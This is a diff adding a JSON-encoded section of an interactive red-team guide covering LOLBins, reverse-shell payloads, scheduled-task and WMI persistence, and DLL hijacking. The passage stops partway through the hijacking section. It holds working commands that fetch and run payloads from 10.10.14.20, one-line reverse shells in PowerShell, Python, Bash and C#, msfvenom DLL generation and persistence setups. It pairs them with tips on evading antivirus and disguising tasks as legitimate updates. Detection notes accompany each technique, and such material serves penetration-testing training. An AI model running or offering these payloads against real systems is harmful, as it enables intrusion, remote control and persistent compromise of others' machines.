@@ -46,6 +46,13 @@
       },
       "status": "Explore the guide",
       "href": "#/guide/red"
+    },
+    {
+      "id": "sl",
+      "title": "ls",
+      "color": "bg-gray-800/80",
+      "status": "Explore the guide",
+      "href": "#/guide/sl"
     }
   ],
   "guideData": {
@@ -13228,20 +13235,1707 @@
           ]
         }
       ]
+    },
+    "sl": {
+      "title": "ls Interactive Guide",
+      "topics": [
+        {
+          "id": "toc",
+          "title": "Welcome to ls",
+          "content": [
+            {
+              "type": "h2",
+              "text": "2.1 <span class=\"hl-blue\">LOLBins</span> (<span class=\"hl-blue\">Living Off the Land Binaries</span>)",
+              "parts": [
+                "2.1 ",
+                {
+                  "text": "LOLBins",
+                  "color": "blue"
+                },
+                " (",
+                {
+                  "text": "Living Off the Land Binaries",
+                  "color": "blue"
+                },
+                ")"
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "What it is / Why it matters",
+              "parts": [
+                "What it is / Why it matters"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                {
+                  "text": "Living Off the Land Binaries",
+                  "color": "yellow"
+                },
+                " (",
+                {
+                  "text": "LOLBins",
+                  "color": "blue"
+                },
+                ") involve using ",
+                {
+                  "text": "legitimate system binaries and scripts",
+                  "color": "yellow"
+                },
+                " to perform ",
+                {
+                  "text": "malicious actions",
+                  "color": "red"
+                },
+                ". This approach makes ",
+                {
+                  "text": "detection harder",
+                  "color": "red"
+                },
+                " as these are ",
+                {
+                  "text": "trusted applications",
+                  "color": "yellow"
+                },
+                " that are typically whitelisted or less scrutinized."
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "Quick steps / Commands",
+              "parts": [
+                "Quick steps / Commands"
+              ]
+            },
+            {
+              "type": "h4",
+              "text": "Windows LOLBins for Download",
+              "parts": [
+                "Windows LOLBins for Download"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# Using certutil to download a file\ncertutil -urlcache -split -f http://10.10.14.20/malware.exe malware.exe\n\n# Using bitsadmin for background download\nbitsadmin /transfer job /download /priority normal http://10.10.14.20/malware.exe C:\\Windows\\Temp\\malware.exe\n\n# Using regsvr32 for scriptlet execution (e.g., download & execute)\nregsvr32 /s /n /u /i:http://10.10.14.20/file.sct scrobj.dll\n\n# Using msiexec to install an MSI package\nmsiexec /q /i http://10.10.14.20/package.msi"
+            },
+            {
+              "type": "h4",
+              "text": "Windows LOLBins for Execution",
+              "parts": [
+                "Windows LOLBins for Execution"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# MSBuild for C# execution (compiles and executes embedded C#)\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe malware.xml\n\n# InstallUtil for executing signed code (e.g., from a .NET assembly)\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U malware.dll\n\n# Rundll32 to execute a specific function in a DLL\nrundll32.exe malware.dll,EntryPoint\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval(\"w=new ActiveXObject(\\\"WScript.Shell\\\");w.run(\\\"calc\\\");window.close()\");"
+            },
+            {
+              "type": "h4",
+              "text": "Linux LOLBins",
+              "parts": [
+                "Linux LOLBins"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Download and execute a script directly\ncurl http://10.10.14.20/shell.sh | bash\nwget -q -O- http://10.10.14.20/shell.sh | bash\n\n# Privilege Escalation (examples)\nsudo -l  # Check sudo permissions for the current user\nfind / -perm -u=s -type f 2>/dev/null  # Find SUID binaries"
+            },
+            {
+              "type": "h3",
+              "text": "What to expect",
+              "parts": [
+                "What to expect"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "These commands ",
+                {
+                  "text": "blend with normal administrative activity",
+                  "color": "yellow"
+                },
+                ", making ",
+                {
+                  "text": "detection difficult",
+                  "color": "red"
+                },
+                ". Execution may be ",
+                {
+                  "text": "blocked by application control policies",
+                  "color": "red"
+                },
+                " or next-gen antivirus."
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "Detection / Hardening",
+              "parts": [
+                "Detection / Hardening"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    {
+                      "text": "Application whitelisting",
+                      "color": "green"
+                    },
+                    " (",
+                    {
+                      "text": "AppLocker",
+                      "color": "blue"
+                    },
+                    ", ",
+                    {
+                      "text": "WDAC",
+                      "color": "blue"
+                    },
+                    ") to prevent unauthorized binaries from running."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Monitor for unusual process chains",
+                      "color": "yellow"
+                    },
+                    " (e.g., ",
+                    {
+                      "type": "inline_code",
+                      "text": "certutil"
+                    },
+                    " spawning ",
+                    {
+                      "type": "inline_code",
+                      "text": "powershell"
+                    },
+                    ", ",
+                    {
+                      "type": "inline_code",
+                      "text": "wscript"
+                    },
+                    " spawning ",
+                    {
+                      "type": "inline_code",
+                      "text": "cmd.exe"
+                    },
+                    ")."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Network monitoring for downloads by system binaries",
+                      "color": "yellow"
+                    },
+                    " from untrusted sources."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "EDR behavioral detection",
+                      "color": "green"
+                    },
+                    " for ",
+                    {
+                      "text": "living-off-the-land patterns",
+                      "color": "yellow"
+                    },
+                    "."
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "Tools / References",
+              "parts": [
+                "Tools / References"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    {
+                      "text": "LOLBAS project",
+                      "color": "fuchsia"
+                    },
+                    ": ",
+                    {
+                      "text": "Living Off The Land Binaries and Scripts",
+                      "color": "yellow"
+                    },
+                    " (lolbas-project.github.io)"
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "GTFO bins",
+                      "color": "fuchsia"
+                    },
+                    ": ",
+                    {
+                      "text": "GTFO (Grep The F**k Out) Bins",
+                      "color": "yellow"
+                    },
+                    " (gtfobins.github.io)"
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Living Off The Land Attack Detection",
+                      "color": "fuchsia"
+                    },
+                    " (various blogs and research papers)"
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "OPSEC / Notes",
+              "parts": [
+                "OPSEC / Notes"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "Use ",
+                    {
+                      "text": "least suspicious binaries first",
+                      "color": "yellow"
+                    },
+                    "."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Chain multiple LOLBins",
+                      "color": "yellow"
+                    },
+                    " to ",
+                    {
+                      "text": "obscure the final payload",
+                      "color": "yellow"
+                    },
+                    "."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Mimic legitimate administrative commands",
+                      "color": "yellow"
+                    },
+                    " to blend in."
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "hr"
+            },
+            {
+              "type": "h2",
+              "text": "2.2 <span class=\"hl-blue\">PowerShell</span> / <span class=\"hl-blue\">C#</span> / <span class=\"hl-blue\">Python</span> / <span class=\"hl-blue\">Bash Payloads</span>",
+              "parts": [
+                "2.2 ",
+                {
+                  "text": "PowerShell",
+                  "color": "blue"
+                },
+                " / ",
+                {
+                  "text": "C#",
+                  "color": "blue"
+                },
+                " / ",
+                {
+                  "text": "Python",
+                  "color": "blue"
+                },
+                " / ",
+                {
+                  "text": "Bash Payloads",
+                  "color": "blue"
+                }
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "What it is / Why it matters",
+              "parts": [
+                "What it is / Why it matters"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "These are ",
+                {
+                  "text": "cross-platform payloads",
+                  "color": "blue"
+                },
+                " and ",
+                {
+                  "text": "reverse shells",
+                  "color": "blue"
+                },
+                " designed for different target environments. They are ",
+                {
+                  "text": "essential for flexibility in engagements",
+                  "color": "green"
+                },
+                ", allowing operators to adapt to various operating systems and security controls."
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "Quick steps / Commands",
+              "parts": [
+                "Quick steps / Commands"
+              ]
+            },
+            {
+              "type": "h4",
+              "text": "PowerShell Reverse Shells",
+              "parts": [
+                "PowerShell Reverse Shells"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "powershell",
+              "text": "# One-liner PowerShell reverse shell (connects to 10.10.14.20:443)\n$client = New-Object System.Net.Sockets.TCPClient('10.10.14.20',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n\n# Base64 encoded version (for -enc parameter)\n# Encode the command:\n$command = '$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.20'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encoded = [Convert]::ToBase64String($bytes)\n# Then execute: powershell -enc $encoded"
+            },
+            {
+              "type": "h4",
+              "text": "Python Reverse Shells",
+              "parts": [
+                "Python Reverse Shells"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "python",
+              "text": "# Python 2.x one-liner reverse shell\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.20\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n# Python 3.x with better error handling and pty for interactive shell\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.20\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+            },
+            {
+              "type": "h4",
+              "text": "Bash Reverse Shells",
+              "parts": [
+                "Bash Reverse Shells"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Standard bash reverse shell\nbash -i >& /dev/tcp/10.10.14.20/443 0>&1\n\n# Alternative bash reverse shell\n/bin/bash -l > /dev/tcp/10.10.14.20/443 0<&1 2>&1\n\n# Using socat for a more stable reverse shell (requires socat to be present)\nsocat TCP:10.10.14.20:443 EXEC:/bin/bash"
+            },
+            {
+              "type": "h4",
+              "text": "C# Reverse Shell (compile first)",
+              "parts": [
+                "C# Reverse Shell (compile first)"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Compile this code into an executable (e.g., using ",
+                {
+                  "type": "inline_code",
+                  "text": "csc.exe"
+                },
+                " on Windows or ",
+                {
+                  "type": "inline_code",
+                  "text": "dotnet build"
+                },
+                " on Linux/macOS)."
+              ]
+            },
+            {
+              "type": "code",
+              "language": "csharp",
+              "text": "using System;\nusing System.Net.Sockets;\nusing System.Diagnostics;\nusing System.IO;\nusing System.Text; // Added for StringBuilder\n\nclass Program {\n    static StreamWriter streamWriter;\n    \n    public static void Main(string[] args) {\n        using(TcpClient client = new TcpClient(\"10.10.14.20\", 443)) {\n            using(Stream stream = client.GetStream()) {\n                using(StreamReader rdr = new StreamReader(stream)) {\n                    streamWriter = new StreamWriter(stream);\n                    \n                    StringBuilder strInput = new StringBuilder();\n                    Process p = new Process();\n                    p.StartInfo.FileName = \"cmd.exe\"; // Or \"/bin/bash\" for Linux\n                    p.StartInfo.CreateNoWindow = true;\n                    p.StartInfo.UseShellExecute = false;\n                    p.StartInfo.RedirectStandardOutput = true;\n                    p.StartInfo.RedirectStandardInput = true;\n                    p.StartInfo.RedirectStandardError = true;\n                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n                    p.Start();\n                    p.BeginOutputReadLine();\n                    \n                    while(true) {\n                        strInput.Append(rdr.ReadLine());\n                        p.StandardInput.WriteLine(strInput);\n                        strInput.Remove(0, strInput.Length);\n                    }\n                }\n            }\n        }\n    }\n    \n    public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) {\n        StringBuilder strOutput = new StringBuilder();\n        if (!String.IsNullOrEmpty(outLine.Data)) {\n            try {\n                strOutput.Append(outLine.Data);\n                streamWriter.WriteLine(strOutput);\n                streamWriter.Flush();\n            } catch (Exception err) { /* Handle potential errors, e.g., stream closed */ }\n        }\n    }\n}"
+            },
+            {
+              "type": "h3",
+              "text": "What to expect",
+              "parts": [
+                "What to expect"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                {
+                  "text": "Immediate shell access",
+                  "color": "green"
+                },
+                " if ",
+                {
+                  "text": "network connectivity exists",
+                  "color": "red"
+                },
+                " and the ",
+                {
+                  "text": "payload executes successfully",
+                  "color": "red"
+                },
+                ". This may be ",
+                {
+                  "text": "blocked by application control",
+                  "color": "red"
+                },
+                " or ",
+                {
+                  "text": "EDR",
+                  "color": "red"
+                },
+                " solutions."
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "Detection / Hardening",
+              "parts": [
+                "Detection / Hardening"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    {
+                      "text": "Network monitoring for reverse shells",
+                      "color": "yellow"
+                    },
+                    " (outbound connections to unusual ports/IPs from system processes)."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Process monitoring for suspicious child processes",
+                      "color": "yellow"
+                    },
+                    " (e.g., ",
+                    {
+                      "type": "inline_code",
+                      "text": "cmd.exe"
+                    },
+                    " or ",
+                    {
+                      "type": "inline_code",
+                      "text": "powershell.exe"
+                    },
+                    " spawning from unexpected parents like ",
+                    {
+                      "type": "inline_code",
+                      "text": "python.exe"
+                    },
+                    " or ",
+                    {
+                      "type": "inline_code",
+                      "text": "svchost.exe"
+                    },
+                    ")."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Application control policies",
+                      "color": "green"
+                    },
+                    " to restrict execution of scripting engines or binaries."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "PowerShell Constrained Language Mode",
+                      "color": "green"
+                    },
+                    " to limit cmdlets and .NET types that can be used."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Script block logging for PowerShell",
+                      "color": "green"
+                    },
+                    " to capture executed script content."
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "Tools / References",
+              "parts": [
+                "Tools / References"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    {
+                      "text": "MSFVenom",
+                      "color": "blue"
+                    },
+                    ": Payload generation framework."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "PowerSploit",
+                      "color": "blue"
+                    },
+                    ": A collection of PowerShell modules for offensive security."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Nishang",
+                      "color": "blue"
+                    },
+                    ": A framework of PowerShell scripts for offensive security."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "RevShells.com",
+                      "color": "blue"
+                    },
+                    ": Online resource for various reverse shell one-liners."
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "OPSEC / Notes",
+              "parts": [
+                "OPSEC / Notes"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "Use ",
+                    {
+                      "text": "encoded/obfuscated versions",
+                      "color": "yellow"
+                    },
+                    " to evade signature-based detection."
+                  ]
+                },
+                {
+                  "parts": [
+                    "Consider ",
+                    {
+                      "text": "staging",
+                      "color": "yellow"
+                    },
+                    " payloads to avoid large one-liners."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Test payloads against target EDR",
+                      "color": "yellow"
+                    },
+                    " solutions before engagement."
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "hr"
+            },
+            {
+              "type": "h2",
+              "text": "2.3 <span class=\"hl-blue\">Scheduled Tasks</span> / <span class=\"hl-blue\">WMI</span>",
+              "parts": [
+                "2.3 ",
+                {
+                  "text": "Scheduled Tasks",
+                  "color": "blue"
+                },
+                " / ",
+                {
+                  "text": "WMI",
+                  "color": "blue"
+                }
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "What it is / Why it matters",
+              "parts": [
+                "What it is / Why it matters"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                {
+                  "text": "Scheduled Tasks",
+                  "color": "yellow"
+                },
+                " and ",
+                {
+                  "text": "WMI",
+                  "color": "blue"
+                },
+                " (Windows Management Instrumentation) are ",
+                {
+                  "text": "legitimate Windows administration tools",
+                  "color": "yellow"
+                },
+                " that can be ",
+                {
+                  "text": "abused for code execution and persistence",
+                  "color": "red"
+                },
+                ". They are ",
+                {
+                  "text": "very common in enterprise environments",
+                  "color": "yellow"
+                },
+                ", making their malicious use difficult to distinguish from benign activity."
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "Quick steps / Commands",
+              "parts": [
+                "Quick steps / Commands"
+              ]
+            },
+            {
+              "type": "h4",
+              "text": "Scheduled Tasks for Execution",
+              "parts": [
+                "Scheduled Tasks for Execution"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# Create a one-time scheduled task via command line (executes malware.exe as SYSTEM)\nschtasks /create /tn \"SystemUpdate\" /tr \"C:\\Windows\\System32\\malware.exe\" /sc once /st 00:00 /ru SYSTEM\nschtasks /run /tn \"SystemUpdate\"\n\n# Create a daily scheduled task with specific user context\nschtasks /create /tn \"OfficeUpdate\" /tr \"C:\\malware.exe\" /sc daily /st 09:00 /u DOMAIN\\User /p Password123\n\n# Create a temporary task that deletes itself after execution\nschtasks /create /tn \"TempTask\" /tr \"cmd.exe /c C:\\malware.exe && schtasks /delete /tn TempTask /f\" /sc once /st 00:01"
+            },
+            {
+              "type": "h4",
+              "text": "PowerShell Scheduled Tasks",
+              "parts": [
+                "PowerShell Scheduled Tasks"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "powershell",
+              "text": "# Create a scheduled task that runs a PowerShell script at user logon as SYSTEM\n$Action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-WindowStyle Hidden -File C:\\malware.ps1\"\n$Trigger = New-ScheduledTaskTrigger -AtLogOn -User \"SYSTEM\"\nRegister-ScheduledTask -TaskName \"WindowsUpdate\" -Action $Action -Trigger $Trigger -RunLevel Highest\n\n# Immediately start an existing scheduled task\nStart-ScheduledTask -TaskName \"WindowsUpdate\""
+            },
+            {
+              "type": "h4",
+              "text": "WMI for Execution",
+              "parts": [
+                "WMI for Execution"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# Local WMI execution (creates a process via WMI)\nwmic process call create \"cmd.exe /c whoami > C:\\output.txt\"\n\n# Remote WMI execution (connects to 192.168.1.10 and creates a process)\nwmic /node:192.168.1.10 /user:DOMAIN\\User /password:Password123 process call create \"malware.exe\""
+            },
+            {
+              "type": "h4",
+              "text": "WMI Permanent Event Subscription (for Persistence)",
+              "parts": [
+                "WMI Permanent Event Subscription (for Persistence)"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "This is a more complex setup that uses WMI event consumers and filters for persistence."
+              ]
+            },
+            {
+              "type": "code",
+              "language": "powershell",
+              "text": "# Define the WMI Event Filter (triggers when notepad.exe is created)\n$FilterArgs = @{\n    Name = 'WindowsUpdateFilter'\n    EventNameSpace = 'root\\cimv2'\n    QueryLanguage = 'WQL'\n    Query = \"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='notepad.exe'\"\n}\n$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs\n\n# Define the WMI Event Consumer (executes cmd.exe /c C:\\malware.exe)\n$ConsumerArgs = @{\n    Name = 'WindowsUpdateConsumer'\n    CommandLineTemplate = \"cmd.exe /c C:\\malware.exe\"\n}\n$Consumer = Set-WmiInstance -Namespace root/subscription -Class __CommandLineEventConsumer -Arguments $ConsumerArgs\n\n# Bind the Filter to the Consumer\nSet-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer}"
+            },
+            {
+              "type": "h3",
+              "text": "What to expect",
+              "parts": [
+                "What to expect"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                {
+                  "text": "Reliable code execution",
+                  "color": "green"
+                },
+                " that ",
+                {
+                  "text": "blends with normal system administration",
+                  "color": "yellow"
+                },
+                ". ",
+                {
+                  "text": "WMI works well for remote execution in domain environments",
+                  "color": "yellow"
+                },
+                ", often bypassing common firewall rules."
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "Detection / Hardening",
+              "parts": [
+                "Detection / Hardening"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    {
+                      "text": "Monitor for suspicious scheduled task names, timings, or unusual actions",
+                      "color": "yellow"
+                    },
+                    "."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "WMI event subscription auditing",
+                      "color": "yellow"
+                    },
+                    " for new or modified event filters/consumers."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Process creation monitoring",
+                      "color": "yellow"
+                    },
+                    " for executables spawned by ",
+                    {
+                      "type": "inline_code",
+                      "text": "svchost.exe"
+                    },
+                    " (scheduled tasks) or ",
+                    {
+                      "type": "inline_code",
+                      "text": "WmiPrvSE.exe"
+                    },
+                    " (WMI provider host)."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Sysmon Event ID 19",
+                      "color": "blue"
+                    },
+                    " (",
+                    {
+                      "text": "WmiEventFilter",
+                      "color": "yellow"
+                    },
+                    "), ",
+                    {
+                      "text": "20",
+                      "color": "blue"
+                    },
+                    " (",
+                    {
+                      "text": "WmiEventConsumer",
+                      "color": "yellow"
+                    },
+                    "), ",
+                    {
+                      "text": "21",
+                      "color": "blue"
+                    },
+                    " (",
+                    {
+                      "text": "WmiEventConsumerToFilter",
+                      "color": "yellow"
+                    },
+                    ") are crucial for WMI persistence detection."
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "Tools / References",
+              "parts": [
+                "Tools / References"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    {
+                      "text": "schtasks.exe",
+                      "color": "blue"
+                    },
+                    ": Native Windows command-line tool for scheduled tasks."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "wmic.exe",
+                      "color": "blue"
+                    },
+                    ": Native Windows command-line tool for WMI."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "PowerShell ScheduledTask module",
+                      "color": "blue"
+                    },
+                    ": PowerShell cmdlets for managing scheduled tasks."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "WMI Explorer",
+                      "color": "blue"
+                    },
+                    ": GUI tool for interacting with WMI."
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "OPSEC / Notes",
+              "parts": [
+                "OPSEC / Notes"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "Use ",
+                    {
+                      "text": "task names that mimic legitimate system tasks",
+                      "color": "yellow"
+                    },
+                    " (e.g., \"GoogleUpdate\", \"AdobeAAMUpdater\")."
+                  ]
+                },
+                {
+                  "parts": [
+                    "For WMI, consider ",
+                    {
+                      "text": "temporary event subscriptions that clean up after themselves",
+                      "color": "yellow"
+                    },
+                    " or use highly specific triggers."
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "hr"
+            },
+            {
+              "type": "h2",
+              "text": "2.4 <span class=\"hl-blue\">DLL Hijacking</span> / <span class=\"hl-blue\">Sideloading</span>",
+              "parts": [
+                "2.4 ",
+                {
+                  "text": "DLL Hijacking",
+                  "color": "blue"
+                },
+                " / ",
+                {
+                  "text": "Sideloading",
+                  "color": "blue"
+                }
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "What it is / Why it matters",
+              "parts": [
+                "What it is / Why it matters"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                {
+                  "text": "DLL Hijacking",
+                  "color": "blue"
+                },
+                " and ",
+                {
+                  "text": "Sideloading",
+                  "color": "blue"
+                },
+                " involve ",
+                {
+                  "text": "exploiting the Windows DLL search order",
+                  "color": "yellow"
+                },
+                " or ",
+                {
+                  "text": "abusing legitimate applications to load malicious DLLs",
+                  "color": "red"
+                },
+                ". This technique is ",
+                {
+                  "text": "very effective for persistence and privilege escalation",
+                  "color": "green"
+                },
+                ", as the malicious code runs within the context of a trusted application."
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "Quick steps / Commands",
+              "parts": [
+                "Quick steps / Commands"
+              ]
+            },
+            {
+              "type": "h4",
+              "text": "Identify Vulnerable Applications",
+              "parts": [
+                "Identify Vulnerable Applications"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# Use Sysinternals Process Monitor to find DLL search order issues\n# 1. Start Process Monitor (procmon.exe)\n# 2. Set filters:\n#    - Operation is \"CreateFile\"\n#    - Result is \"NAME NOT FOUND\"\n#    - Path ends with \".dll\"\n# 3. Look for applications searching for DLLs in writable directories\n#    (e.g., C:\\Program Files\\AppName\\, C:\\Program Files (x86)\\AppName\\, application installation directories)"
+            },
+            {
+              "type": "h4",
+              "text": "Generate Malicious DLL",
+              "parts": [
+                "Generate Malicious DLL"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Using msfvenom to generate a 64-bit Meterpreter reverse HTTPS DLL\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.20 LPORT=443 -f dll > hijack.dll\n\n# For x86 systems\nmsfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.20 LPORT=443 -f dll > hijack.dll"
+            },
+            {
+              "type": "h4",
+              "text": "Common Hijacking Scenarios",
+              "parts": [
+                "Common Hijacking Scenarios"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "**",
+                    {
+                      "text": "DLL Search Order Hijacking",
+                      "color": "blue"
+                    },
+                    " Place your malicious ",
+                    {
+                      "text": "`hijack.dll`",
+                      "color": "blue"
+                    },
+                    " in a directory where a legitimate application searches for DLLs ",
+                    "*before*",
+                    " it finds the genuine one (e.g., the application's own directory)."
+                  ]
+                },
+                {
+                  "parts": [
+                    "**",
+                    {
+                      "text": "Phantom DLL Hijacking",
+                      "color": "blue"
+                    },
+                    " An application attempts to load a ",
+                    {
+                      "text": "missing DLL",
+                      "color": "yellow"
+                    },
+                    ". Place your malicious DLL with that missing name in one of the directories the application searches."
+                  ]
+                },
+                {
+                  "parts": [
+                    "**",
+                    {
+                      "text": "SideLoading",
+                      "color": "blue"
+                    },
+                    " Replace a legitimate DLL within a signed application's directory with your malicious version. The application loads your DLL, believing it to be legitimate."
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# Example for a missing DLL scenario:\n# If an application tries to load \"C:\\Program Files\\VulnerableApp\\missing.dll\" but it doesn't exist,\n# place your malicious `missing.dll` in that specific location."
+            },
+            {
+              "type": "h4",
+              "text": "Tools for Discovery",
+              "parts": [
+                "Tools for Discovery"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "powershell",
+              "text": "# PowerSploit's Find-ProcessDLLHijack module for automated analysis\nFind-ProcessDLLHijack\n\n# Manual checking with Sysinternals Procmon\nprocmon.exe -nofilter -accepteula\n# Apply filters (Process Name, Path, Result, Operation) as described above."
+            },
+            {
+              "type": "h4",
+              "text": "DLL Proxying (Maintain Functionality)",
+              "parts": [
+                "DLL Proxying (Maintain Functionality)"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "To avoid crashing the legitimate application, an attacker can create a ",
+                {
+                  "text": "proxy DLL",
+                  "color": "blue"
+                },
+                " that forwards calls to the original DLL while executing malicious code."
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cpp",
+              "text": "// Example: Forward exports to the legitimate DLL while adding malicious code\n// Requires knowledge of the original DLL's exported functions.\n// This example uses a linker directive for Visual C++.\n#pragma comment(linker, \"/export:RealFunction=hijack.RealFunction,@1\") // Forward export\n// (More complex implementations typically involve manually writing forwarders for all exports)"
+            },
+            {
+              "type": "h3",
+              "text": "What to expect",
+              "parts": [
+                "What to expect"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "When the vulnerable application runs, your ",
+                {
+                  "text": "malicious DLL loads with the application's privileges",
+                  "color": "red"
+                },
+                ". This attack may ",
+                {
+                  "text": "require specific conditions or user actions",
+                  "color": "yellow"
+                },
+                " to trigger the vulnerable application."
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "Detection / Hardening",
+              "parts": [
+                "Detection / Hardening"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    {
